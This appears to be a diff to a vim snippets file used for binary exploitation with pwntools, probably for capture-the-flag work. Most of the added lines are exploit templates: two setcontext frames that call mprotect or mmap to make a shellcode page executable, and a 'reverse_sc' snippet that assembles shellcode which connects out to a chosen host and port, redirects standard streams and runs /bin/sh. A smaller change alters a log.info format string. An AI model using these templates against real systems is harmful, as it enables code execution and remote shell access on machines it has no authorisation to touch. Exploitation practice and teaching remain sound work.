@@ -39,7 +39,7 @@ def ${1:func}(${4:data}):
 endsnippet
 
 snippet info
-log.info('${1}: {}'.format())
+log.info('${1}: {}'.format(hex($1)))
 endsnippet
 
 snippet base
@@ -68,4 +68,39 @@ assert s.check() == sat
 
 m = s.model()
 print "".join([chr(m[x[i]].as_long()) for i in range(32)])
+endsnippet
+
+snippet setcontext_mprotect
+# mprotect(addr, length, RWX)
+ret = libc_base + 0x`objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -m1 'ret' | awk -F':' '{print $1}' | tr -d ' '`
+sc_page = sc_addr & 0xffffffffffff000
+setcontext_args = flat(
+    'a'*0x28,                      # padding
+    0, 0, 0, 0, 0, 0, 0, 0,        # r8, r9, x, x, r12, r13, r14, r15
+    sc_page, 0x1000, 0, 0, 7, 0,   # rdi, rsi, rbp, rbx, rdx, x
+    0, rop_addr, ret,              # rcx, rsp, rip
+)
+endsnippet
+
+snippet setcontext_mmap
+# mmap(addr, length, RWX, flags=rcx, fd=r8, offset=r9)
+ret = libc_base + 0x`objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -m1 'ret' | awk -F':' '{print $1}' | tr -d ' '`
+sc_page = sc_addr & 0xffffffffffff000
+setcontext_args = flat(
+    'a'*0x28,                      # padding
+    0, 0, 0, 0, 0, 0, 0, 0,        # r8, r9, x, x, r12, r13, r14, r15
+    sc_page, 0x1000, 0, 0, 7, 0,   # rdi, rsi, rbp, rbx, rdx, x
+    0x22, rop_addr, ret,           # rcx, rsp, rip
+)
+endsnippet
+
+snippet reverse_sc
+context.arch = 'amd64'
+sc = asm(
+    shellcraft.connect(${1:'localhost'}, ${2:1234}) +
+    'push rbp; pop rdi; xor esi, esi; push SYS_dup2; pop rax; syscall;' +
+    'push rbp; pop rdi; push 1; pop rsi; push SYS_dup2; pop rax; syscall;' +
+    'push rbp; pop rdi; push 2; pop rsi; push SYS_dup2; pop rax; syscall;' +
+    shellcraft.execve('/bin/sh')
+)
 endsnippet
